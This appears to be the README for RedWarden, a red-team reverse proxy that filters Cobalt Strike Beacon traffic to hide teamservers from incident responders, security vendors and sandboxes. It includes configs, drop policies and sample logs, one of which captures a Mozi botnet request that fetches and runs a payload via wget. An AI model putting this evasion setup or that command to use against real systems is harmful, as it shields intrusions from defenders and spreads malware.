# RedWarden 

(previously [proxy2's](https://github.com/mgeeky/proxy2) _malleable_redirectory_ plugin)

**Let's raise the bar in C2 redirectors IR resiliency, shall we?**

Red Teaming business has seen [several](https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/) [different](https://posts.specterops.io/automating-apache-mod-rewrite-and-cobalt-strike-malleable-c2-profiles-d45266ca642) [great](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10) ideas on how to combat incident responders and misdirect them while offering resistant C2 redirectors network at the same time.  

This work combines many of those great ideas into a one, lightweight utility, mimicking Apache2 in it's roots of being a simple HTTP(S) reverse-proxy. 

Combining Malleable C2 profiles understanding, knowledge of bad IP addresses pool and a flexibility of easily adding new inspection and misrouting logic - resulted in having a crafty repellent for IR inspections. 


![RedWarden](https://github.com/mgeeky/RedWarden/raw/master/images/1.png)


### Abstract

This program acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon inbound C2 HTTP requests selecting which packets to direct to the Teamserver and which to drop, similarly to the .htaccess file in Apache2's `mod_rewrite`.

`RedWarden` was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the C2 redirector's layer. It's intended to supersede classical Apache2 + mod_rewrite or alike setups used for redirectors.

** Features:**

- Malleable C2 Profile parser able to validate inbound HTTP/S requests strictly according to malleable's contract and drop outlaying packets in case of violation (Malleable Profiles 4.0+ with variants covered)
- Ability to unfilter/repair unexpected and unwanted HTTP headers added by interim systems such as proxies and caches (think CloudFlare) in order to conform to a valid Malleable contract. 
- Integrated curated massive blacklist of IPv4 pools and ranges known to be associated with IT Security vendors
- Grepable output log entries (in both Apache2 combined access log and custom RedWarden formats) useful to track peer connectivity events/issues
- Ability to query connecting peer's IPv4 address against IP Geolocation/whois information and confront that with predefined regular expressions to rule out peers connecting outside of trusted organizations/countries/cities etc.
- Built-in Replay attacks mitigation enforced by logging accepted requests' MD5 hashsums into locally stored SQLite database and preventing requests previously accepted.
- Allows to define ProxyPass statemtents to pass requests matching specific URL onto other Hosts
- Support for multiple Teamservers
- Support for many reverse-proxying Hosts/redirection sites giving in a randomized order - which lets load-balance traffic or build more versatile infrastructures
- Can repair HTTP packets according to expected malleable contract in case some of the headers were corrupted in traffic
- Sleepless nights spent on troubleshooting "why my Beacon doesn't work over CloudFlare/CDN/Domain Fronting" are over now thanks to detailed verbose HTTP(S) requests/responses logs

The RedWarden acts as a CobaltStrike Teamserver C2 redirector, given Malleable C2 profile used during the campaign and teamserver's `hostname:port`. It will parse supplied malleable profile in order to understand which inbound requests may possibly come from the compatible Beacons and differentiate them from the ones that are not compliant and thus should be misdirected. 

Sections such as `http-stager`, `http-get`, `http-post` and their corresponding uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request and some Internet noise or IR/AV/EDRs out of bound inquiries. 

The program benefits from the marvelous known bad IP ranges coming from:
  curi0usJack and the others:
  [https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10)

Using an IP addresses blacklisting along with known bad keywords lookup through Reverse-IP DNS queries and HTTP headers inspection, brings the reliability to considerably increase redirector's resiliency to the unauthorized peers wanting to examine attacker infrastructures.

Use wisely, stay safe.


### Impose IP Geolocation on your Beacon traffic originators

You've done your Pre-Phish and OSINT very well. You now know where your targets live and have some clues where traffic should be originating from, or at least how to detect completely auxiliary traffic.
How to impose IP Geolocation on Beacon requests on a redirector?

RedWarden comes at help!

Let's say, you want only to accept traffic originating from Poland, Europe. 
Your Pre-Phish/OSINT results indicate that:

- `89.64.64.150` is a legitimate IP of one of your targets, originating from Poland
- `59.99.140.76` whereas this one is not and it reached your systems as a regular Internet noise packet.

You can use RedWarden's utility `lib/ipLookupHelper.py` to collect IP Geo metadata about these two addresses:

```
bash$ python3 ipLookupHelper.py

Usage: ./ipLookupHelper.py <ipaddress> [malleable-redirector-config]

Use this small utility to collect IP Lookup details on your target IPv4 address and verify whether
your 'ip_geolocation_requirements' section of proxy2 malleable-redirector-config.yaml would match that
IP address. If second param is not given - no 
```

The former brings:
```
bash$ python3 ipLookupHelper.py 89.64.64.150
[dbg] Following IP Lookup providers will be used: ['ip_api_com', 'ipapi_co']
[.] Lookup of: 89.64.64.150
[dbg] Calling IP Lookup provider: ipapi_co
[dbg] Calling IP Lookup provider: ip_api_com
[dbg] New IP lookup entry cached: 89.64.64.150
[.] Output:
{
  "organization": [
    "UPC Polska Sp. z o.o.",
    "UPC.pl",
    "AS6830 Liberty Global B.V."
  ],
  "continent": "Europe",
  "continent_code": "EU",
  "country": "Poland",
  "country_code": "PL",
  "ip": "89.64.64.150",
  "city": "Warsaw",
  "timezone": "Europe/Warsaw",
  "fulldata": {
    "status": "success",
    "country": "Poland",
    "countryCode": "PL",
    "region": "14",
    "regionName": "Mazovia",
    "city": "Warsaw",
    "zip": "00-202",
    "lat": 52.2484,
    "lon": 21.0026,
    "timezone": "Europe/Warsaw",
    "isp": "UPC.pl",
    "org": "UPC Polska Sp. z o.o.",
    "as": "AS6830 Liberty Global B.V.",
    "query": "89.64.64.150"
  },
  "reverse_ip": "89-64-64-150.dynamic.chello.pl"
}
```

and the latter gives:
```
bash$ python3 ipLookupHelper.py 59.99.140.76
[dbg] Following IP Lookup providers will be used: ['ip_api_com', 'ipapi_co']
[dbg] Read 1 cached entries from file.
[.] Lookup of: 59.99.140.76
[dbg] Calling IP Lookup provider: ip_api_com
[dbg] New IP lookup entry cached: 59.99.140.76
[.] Output:
{
  "organization": [
    "",
    "BSNL Internet",
    "AS9829 National Internet Backbone"
  ],
  "continent": "Asia",
  "continent_code": "AS",
  "country": "India",
  "country_code": "IN",
  "ip": "59.99.140.76",
  "city": "Palakkad",
  "timezone": "Asia/Kolkata",
  "fulldata": {
    "status": "success",
    "country": "India",
    "countryCode": "IN",
    "region": "KL",
    "regionName": "Kerala",
    "city": "Palakkad",
    "zip": "678001",
    "lat": 10.7739,
    "lon": 76.6487,
    "timezone": "Asia/Kolkata",
    "isp": "BSNL Internet",
    "org": "",
    "as": "AS9829 National Internet Backbone",
    "query": "59.99.140.76"
  },
  "reverse_ip": ""
}
```

Now you see that the former one had `"country": "Poland"` whereas the latter `"country": "India"`. With that knowledge we are ready to devise our constraints in form of a hefty YAML dictionary:

```
ip_geolocation_requirements:
  organization:
  continent:
  continent_code:
  country:
     - Poland
     - PL
     - Polska
  country_code:
  city:
  timezone:
```

Each of that dictionary's entries accept regular expression to be matched upon determined IP Geo metadata of inbound peer's IP address.
We use three entries in `country` property to allow requests having one of specified values.

Having that set in your configuration, you can verify whether another IP address would get passed through RedWarden's IP Geolocation discriminator or not with `ipLookupHelper` utility accepting second parameter:

![ipLookupHelper IP Geo discriminator](https://github.com/mgeeky/RedWarden/raw/master/images/2.png)

The very last line tells you whether packet would be blocked or accepted.

And that's all! Configure your IP Geolocation constraints wisely and safely, carefully inspect RedWarden logs for any IP Geo-related DROP entries and keep your C2 traffic nice and tidy!


### Repair tampered Beacon requests

If you happen to use interim systems such as AWS Lambda or CloudFlare as your Domain Fronting / redirectors, you have surely came across a situation where some of your packets couldn't get accepted by the Teamserver as they deviated from the agreed malleable contract. Was it a tampered or removed HTTP header, reordered cookies or anything else - I bet that wasted plenty hours of your life.

To combat C2 channels setup process issues and interim systems tamperings, RedWarden offers functionality to repair Beacon packets.

It does so by checking what Malleable Profile expects packet to be and can restore configured HTTP headers to their agreed values according to the profile's requirements.

Consider following simple profile:

```
http-get {
        set uri "/api/abc";
        client {

                header "Accept-Encoding" "gzip, deflate";

                metadata {
                        base64url;
                        netbios;
                        base64url;
                        parameter "auth";
                }
        }
        ...
```

You see this `Accept-Encoding`? Every Beacon request has to come up with that Header and that value. What happens if your Beacon hits CloudFlare systems and they emit a request that will be stripped from that Header or will have `Accept-Encoding: gzip` instead? Teamserver will drop the request on the spot.

By setting this header in RedWarden configuration section dubbed `protect_these_headers_from_tampering` you can safe your connection.:

```
#
# If RedWarden validates inbound request's HTTP headers, according to policy drop_malleable_without_expected_header_value:
#   "[IP: DROP, reason:6] HTTP request did not contain expected header value:"
#
# and senses some header is missing or was overwritten along the wire, the request will be dropped. We can relax this policy
# a bit however, since there are situations in which Cache systems (such as Cloudflare) could tamper with our requests thus
# breaking Malleable contracts. What we can do is to specify list of headers, that should be overwritten back to their values
# defined in provided Malleable profile.
#
# So for example, if our profile expects:
#   header "Accept-Encoding" "gzip, deflate";
#
# but we receive a request having following header set instead:
#   Accept-Encoding: gzip
#
# Because it was tampered along the wire by some of the interim systems (such as web-proxies or caches), we can
# detect that and set that header's value back to what was expected in Malleable profile.
#
# In order to protect Accept-Encoding header, as an example, the following configuration could be used:
#   protect_these_headers_from_tampering:
#     - Accept-Encoding
#
#
# Default: <empty-list>
#
protect_these_headers_from_tampering:
  - Accept-Encoding
```


### Example usage

All settings were moved to the external file:
```
$ python3 RedWarden.py --config example-config.yaml

  [INFO] 19:21:42: Loading 1 plugin...
  [INFO] 19:21:42: Plugin "malleable_redirector" has been installed.
  [INFO] 19:21:42: Preparing SSL certificates and keys for https traffic interception...
  [INFO] 19:21:42: Using provided CA key file: ca-cert/ca.key
  [INFO] 19:21:42: Using provided CA certificate file: ca-cert/ca.crt
  [INFO] 19:21:42: Using provided Certificate key: ca-cert/cert.key
  [INFO] 19:21:42: Serving http proxy on: 0.0.0.0, port: 80...
  [INFO] 19:21:42: Serving https proxy on: 0.0.0.0, port: 443...
  [INFO] 19:21:42: [REQUEST] GET /jquery-3.3.1.min.js
  [INFO] 19:21:42: == Valid malleable http-get request inbound.
  [INFO] 19:21:42: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
  [INFO] 19:21:42: [RESPONSE] HTTP 200 OK, length: 5543
  [INFO] 19:21:45: [REQUEST] GET /jquery-3.3.1.min.js
  [INFO] 19:21:45: == Valid malleable http-get request inbound.
  [INFO] 19:21:45: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
  [INFO] 19:21:45: [RESPONSE] HTTP 200 OK, length: 5543
  [INFO] 19:21:46: [REQUEST] GET /
  [...]
  [ERROR] 19:24:46: [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
  [...]
  [INFO] 19:24:46: [RESPONSE] HTTP 301 Moved Permanently, length: 212
  [INFO] 19:24:48: [REQUEST] GET /jquery-3.3.1.min.js
  [INFO] 19:24:48: == Valid malleable http-get request inbound.
  [INFO] 19:24:48: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
  [...]
```

Where **example-config.yaml** contains:

```
verbose: True

port:
  - 80/http
  - 443/https

profile: jquery-c2.3.14.profile

# Let's Encrypt certificates
ssl_cacert: /etc/letsencrypt/live/attacker.com/fullchain.pem
ssl_cakey: /etc/letsencrypt/live/attacker.com/privkey.pem

teamserver_url:
  - 1.2.3.4:8080
```

The above output contains a line pointing out that there has been an unauthorized, not compliant with our C2 profile inbound request, which got dropped due to incompatible User-Agent string presented:
```
  [...]
  [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
  [...]
```


### Example output

Let's take a look at the output the proxy produces.

Under `verbose: True` option, the verbosity will be set to INFO at most telling accepted requests from dropped ones.

The request may be accepted if it confronted to all of the criterias configured in RedWarden's configuration file. Such a situation will be followed with `[ALLOW, ...]` entry log:

```
[INFO] 2021-04-24/17:30:48: [REQUEST] GET /js/scripts.js
[INFO] 2021-04-24/17:30:48: == Valid malleable http-get (variant: default) request inbound.
[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
[INFO] 2021-04-24/17:30:48: Connected peer sent 2 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
[INFO] 2021-04-24/17:30:48: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
```

Should the request fail any of the checks RedWarden carries on each request, the corresponding `[DROP, ...]` line will be emitted containing information about the drop **reason**.:

```
[INFO] 2021-04-24/16:48:28: [REQUEST] GET /
[ERROR] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, reason:1, 128.14.211.186] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[ERROR] 2021-04-24/16:48:29: [REDIRECTING invalid request from 128.14.211.186 (zl-dal-us-gp3-wk107.internet-census.org)] GET /
```

There are plenty of reasons dictating whether request can be dropped. Each of these checks can be independently turned on and off according to requirements or in a process of fine-tuning or erroneus decision fixing:

Excerpt from `example-config.yaml`:
```
#
# Fine-grained requests dropping policy - lets you decide which checks
# you want to have enforced and which to skip by setting them to False
#
# Default: all checks enabled
#
policy:
  # [IP: ALLOW, reason:0] Request conforms ProxyPass entry (url="..." host="..."). Passing request to specified host
  allow_proxy_pass: True
  # [IP: ALLOW, reason:2] Peer's IP was added dynamically to a whitelist based on a number of allowed requests
  allow_dynamic_peer_whitelisting: True
  # [IP: DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
  drop_invalid_useragent: True
  # [IP: DROP, reason:2] HTTP header name contained banned word
  drop_http_banned_header_names: True
  # [IP: DROP, reason:3] HTTP header value contained banned word:
  drop_http_banned_header_value: True
  # [IP: DROP, reason:4b] peer's reverse-IP lookup contained banned word
  drop_dangerous_ip_reverse_lookup: True
  # [IP: DROP, reason:4e] Peer's IP geolocation metadata contained banned keyword! Peer banned in generic fashion.
  drop_ipgeo_metadata_containing_banned_keywords: True
  # [IP: DROP, reason:5] HTTP request did not contain expected header
  drop_malleable_without_expected_header: True
  # [IP: DROP, reason:6] HTTP request did not contain expected header value:
  drop_malleable_without_expected_header_value: True
  # [IP: DROP, reason:7] HTTP request did not contain expected (metadata|id|output) section header:
  drop_malleable_without_expected_request_section: True
  # [IP: DROP, reason:8] HTTP request was expected to contain (metadata|id|output) section with parameter in URI:
  drop_malleable_without_request_section_in_uri: True
  # [IP: DROP, reason:9] Did not found append pattern:
  drop_malleable_without_prepend_pattern: True
  # [IP: DROP, reason:10] Did not found append pattern:
  drop_malleable_without_apppend_pattern: True
  # [IP: DROP, reason:11] Requested URI does not aligns any of Malleable defined variants:
  drop_malleable_unknown_uris: True
  # [IP: DROP, reason:12] HTTP request was expected to contain <> section with URI-append containing prepend/append fragments
  drop_malleable_with_invalid_uri_append: True
```


By default all of these checks are enforced.

Here is the example output from running the proxy - showing how requests gets dropped and allowed:

```
[INFO] 2021-04-24/16:37:13: Loading 1 plugin...
[INFO] 2021-04-24/16:37:13: Plugin "malleable_redirector" has been installed.
[INFO] 2021-04-24/16:37:13: Preparing SSL certificates and keys for https traffic interception...
[INFO] 2021-04-24/16:37:13: Using provided CA key file: /etc/letsencrypt/live/attacker.com/privkey.pem
[INFO] 2021-04-24/16:37:13: Using provided CA certificate file: /etc/letsencrypt/live/attacker.com/fullchain.pem
[INFO] 2021-04-24/16:37:13: Using provided Certificate key: /home/mariusz/devel/Penetration-Testing-Tools/red-teaming/malleable_redirector/proxy2/ca-cert/cert.key
[INFO] 2021-04-24/16:37:13: Teeing stdout output to /home/mariusz/work/santa-soc-21/proxy2.log log file.
[INFO] 2021-04-24/16:37:13: Collected 3 proxy-pass statements:
        Rule 0. Proxy requests with URL: "^/foobar\d*$" to host bing.com
        Rule 1. Proxy requests with URL: "^/myip$" to target URL http://ip-api.com/json/
        Rule 2. Proxy requests with URL: "^/alwayspass$" to host google.com (options: nodrop)
[INFO] 2021-04-24/16:37:13: Loaded 1890 blacklisted CIDRs.
[INFO] 2021-04-24/16:37:13: Serving proxy on: http://0.0.0.0:80 ...
[INFO] 2021-04-24/16:37:13: Serving proxy on: https://0.0.0.0:443 ...
[INFO] 2021-04-24/16:48:28: [REQUEST] GET /
[ERROR] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, reason:1, 128.14.211.186] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[ERROR] 2021-04-24/16:48:29: [REDIRECTING invalid request from 128.14.211.186 (zl-dal-us-gp3-wk107.internet-census.org)] GET /
[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:29, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[INFO] 2021-04-24/16:48:29: [RESPONSE] HTTP 301 Moved Permanently, length: 183
[INFO] 2021-04-24/16:59:56: [REQUEST] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
[ERROR] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, reason:1, 59.99.140.76] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
[ERROR] 2021-04-24/16:59:57: [REDIRECTING invalid request from 59.99.140.76] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:57, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
[INFO] 2021-04-24/16:59:57: [RESPONSE] HTTP 301 Moved Permanently, length: 212
[INFO] 2021-04-24/17:02:50: [REQUEST] GET /
[ERROR] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
[INFO] 2021-04-24/17:02:50: Here is what we know about that address (94.127.104.226): ({'organization': ['', 'INEA SA', 'AS13110 INEA S.A.'], 'continent': 'Europe', 'continent_code': 'EU', 'country': 'Poland', 'country_code': 'PL', 'ip
[INFO] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
[ERROR] 2021-04-24/17:02:58: [REDIRECTING invalid request from 94.127.104.226 (d104-226.icpnet.pl)] GET /
[ERROR] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
[INFO] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
[INFO] 2021-04-24/17:02:58: [RESPONSE] HTTP 301 Moved Permanently, length: 212
[INFO] 2021-04-24/17:03:26: [REQUEST] GET /
[ERROR] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, reason:1, 128.14.211.190] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[ERROR] 2021-04-24/17:03:26: [REDIRECTING invalid request from 128.14.211.190 (zl-dal-us-gp3-wk108.internet-census.org)] GET /
[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[INFO] 2021-04-24/17:03:26: [RESPONSE] HTTP 301 Moved Permanently, length: 183
[INFO] 2021-04-24/17:10:18: [REQUEST] GET /
[ERROR] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, reason:1, 51.254.59.114] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
[ERROR] 2021-04-24/17:10:19: [REDIRECTING invalid request from 51.254.59.114 (scan019.intrinsec.com)] GET /
[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:19, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
[INFO] 2021-04-24/17:10:19: [RESPONSE] HTTP 301 Moved Permanently, length: 212
[INFO] 2021-04-24/17:14:32: [REQUEST] GET /
[ERROR] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, reason:1, 45.83.67.59] inbound User-Agent differs from the one defined in C2 profile.
[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
[ERROR] 2021-04-24/17:14:33: [REDIRECTING invalid request from 45.83.67.59] GET /
[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:33, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
[INFO] 2021-04-24/17:14:33: [RESPONSE] HTTP 301 Moved Permanently, length: 183
[INFO] 2021-04-24/17:30:09: [REQUEST] GET /js/scripts.js
[INFO] 2021-04-24/17:30:17: == Valid malleable http-get (variant: default) request inbound.
[INFO] 2021-04-24/17:30:17: Here is what we know about that address (111.222.223.224): ({'organization': ['Santander Bank Polska S.A', 'Santander Bank Polska S.A.', 'AS59977 Santander Bank Polska S.A.'], 'continent': 'Europe', 'continent
[INFO] 2021-04-24/17:30:17: [ALLOW, 2021-04-24/19:30:09, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
[INFO] 2021-04-24/17:30:17: Connected peer sent 1 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
[INFO] 2021-04-24/17:30:17: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
[INFO] 2021-04-24/17:30:18: [ALLOW, 2021-04-24/19:30:18, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
[INFO] 2021-04-24/17:30:18: [RESPONSE] HTTP 200 OK, length: 1828
[INFO] 2021-04-24/17:30:48: [REQUEST] GET /js/scripts.js
[INFO] 2021-04-24/17:30:48: == Valid malleable http-get (variant: default) request inbound.
[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
[INFO] 2021-04-24/17:30:48: Connected peer sent 2 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
[INFO] 2021-04-24/17:30:48: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
[INFO] 2021-04-24/17:30:48: [RESPONSE] HTTP 200 OK, length: 202937
[INFO] 2021-04-24/17:30:49: [REQUEST] POST /fonts/KFOmCnqEu92Fr1Mu4mxK.woff2
[INFO] 2021-04-24/17:30:49: == Valid malleable http-post (variant: default) request inbound.
```

Turning `debug: True` will swamp your console buffer with plenty of log lines describing each step RedWarden takes in its complex decisioning process. 
If you want to see your requests and responses full bodies - set `debug` and `trace` to true and get buried in logging burden!


### Plugin options

Following options/settings are supported:

```
#
# This is a sample config file for RedWarden.
#


#
# ====================================================
# General proxy related settings
# ====================================================
#

# Print verbose output. Implied if debug=True. Default: False
verbose: True

# Print debugging output that includes HTTP request/response trace. Default: False
debug: False

# Redirect RedWarden's output to file. Default: stdout.
# Creates a file in the same directory that this config file is situated.
output: redirector.log

# Write web server access attempts in Apache2 access.log format into this file.
access_log: access.log

# If 'output' is specified, tee program's output to file and stdout at the same time.
# Default: False
tee: True


#
# Ports on which RedWarden should bind & listen
#
port:
  - 80/http
  - 443/https

#
# SSL certificate CAcert (pem, crt, cert) and private key CAkey
#
ssl_cacert: /etc/letsencrypt/live/attacker.com/fullchain.pem
ssl_cakey: /etc/letsencrypt/live/attacker.com/privkey.pem


#
# Drop invalid HTTP requests
#
# If a stream that doesn't resemble valid HTTP protocol reaches RedWarden listener, 
# should we drop it or process it? By default we drop it.
#
# Default: True
#
drop_invalid_http_requests: True


#
# Path to the Malleable C2 profile file. 
# If not given, most of the request-validation logic won't be used.
#
profile: malleable.profile

#
# (Required) Address where to redirect legitimate inbound beacon requests.
# A.k.a. TeamServer's Listener bind address, in a form of:
#       [inport:][http(s)://]host:port
#
# If RedWarden was configured to listen on more than one port, specifying "inport" will 
# help the plugin decide to which teamserver's listener redirect inbound request. 
#
# If 'inport' values are not specified in the below option (teamserver_url) the script
# will pick destination teamserver at random.
#
# Having RedWarden listening on only one port does not mandate to include the "inport" part.
# This field can be either string or list of strings.
#
teamserver_url: 
  - 1.2.3.4:5555


#
# Report only instead of actually dropping/blocking/proxying bad/invalid requests.
# If this is true, will notify that the request would be block if that option wouldn't be
# set. 
#
# Default: False
#
report_only: False

#
# Log full bodies of dropped requests.
#
# Default: False
#
log_dropped: False

#
# What to do with the request originating not conforming to Beacon, whitelisting or 
# ProxyPass inclusive statements: 
#   - 'redirect' it to another host with (HTTP 301), 
#   - 'reset' a TCP connection with connecting client
#   - 'proxy' the request, acting as a reverse-proxy against specified action_url 
#       (may be dangerous if client fetches something it shouldn't supposed to see!)
#
# Valid values: 'reset', 'redirect', 'proxy'. 
#
# Default: redirect
#
drop_action: redirect

#
# If someone who is not a beacon hits the proxy, or the inbound proxy does not meet 
# malleable profile's requirements - where we should proxy/redirect his requests. 
# The protocol HTTP/HTTPS used for proxying will be the same as originating
# requests' protocol. Redirection in turn respects protocol given in action_url.
#
# This value may be a comma-separated list of hosts, or a YAML array to specify that
# target action_url should be picked at random:
#   action_url: https://google.com, https://gmail.com, https://calendar.google.com
#
# Default: https://google.com
#
action_url: 
  - https://google.com

#
# ProxyPass alike functionality known from mod_proxy.
#
# If inbound request matches given conditions, proxy that request to specified host,
# fetch response from target host and return to the client. Useful when you want to 
# pass some requests targeting for instance attacker-hosted files onto another host, but
# through the one protected with malleable_redirector.
#
# Protocol used for ProxyPass will match the one from originating request unless specified explicitely.
# If host part contains http:// or https:// schema - that schema will be used.
# 
# Syntax:
#   proxy_pass:
#     - /url_to_be_passed example.com
#     - /url_to_be_passed_onto_http http://example.com
#
# The first parameter 'url' is a regex (case-insensitive). Must start with '/'.
# The regex begin/end operators are implied and will constitute following regex to be 
# matched against inbound request's URL:
#     '^/' + url_to_be_passed + '$'
#
# Here are the URL rewriting rules:
#   Example, inbound request:
#       https://attacker.com/dl/file-to-be-served.txt
#
#   Rules:
#     a) Entire URL to be substituted for proxy pass:
#       proxy_pass:
#           - /dl/.+   https://localhost:8888/   
#                ====> will redirect to https://localhost:8888/
#
#     b) Only host to be substituted for proxy pass:
#       proxy_pass:
#           - /dl/.+   localhost:8888   
#                ====> will redirect to https://localhost:8888/dl/file-to-be-served.txt
#
# Following options are supported:
#   - nodrop  - Process this rule at first, before evaluating any DROP-logic. 
#               Does not let processed request to be dropped.
#
# Default: No proxy pass rules.
#
proxy_pass:
  # These are example proxy_pass definitions:
  - /foobar\d*  bing.com
  - /myip       http://ip-api.com/json/
  - /alwayspass google.com nodrop


#
# If set, removes all HTTP headers sent by Client that are not expected by Teamserver according
# to the supplied Malleable profile and its client { header ... } section statements. Some CDNs/WebProxy
# providers such as CloudFlare may add tons of their own metadata headers (like: CF-IPCountry, CF-RAY, 
# CF-Visitor, CF-Request-ID, etc.) that can make Teamserver unhappy about inbound HTTP Request which could
# cause its refusal. 
#
# We can strip all of these superfluous, not expected by Teamserver HTTP headers delivering a vanilla plain
# request. This is recommended setting in most scenarios.
#
# Do note however, that Teamserver by itself ignores superfluous headers it receives in requests, as long as they 
# don't compromise integrity of the malleable transaction.
#
# Default: True
#
remove_superfluous_headers: True

#
# Every time malleable_redirector decides to pass request to the Teamserver, as it conformed
# malleable profile's contract, a MD5 sum may be computed against that request and saved in sqlite
# file. Should there be any subsequent request evaluating to a hash value that was seen & stored
# previously, that request is considered as Replay-Attack attempt and thus should be banned.
#
# CobaltStrike's Teamserver has built measures aginst replay-attacks, however malleable_redirector may
# assist in that activity as well.
#
# Default: False
#
mitigate_replay_attack: False


#
# List of whitelisted IP addresses/CIDR ranges.
# Inbound packets from these IP address/ranges will always be passed towards specified TeamServer without
# any sort of verification or validation.
#
whitelisted_ip_addresses:
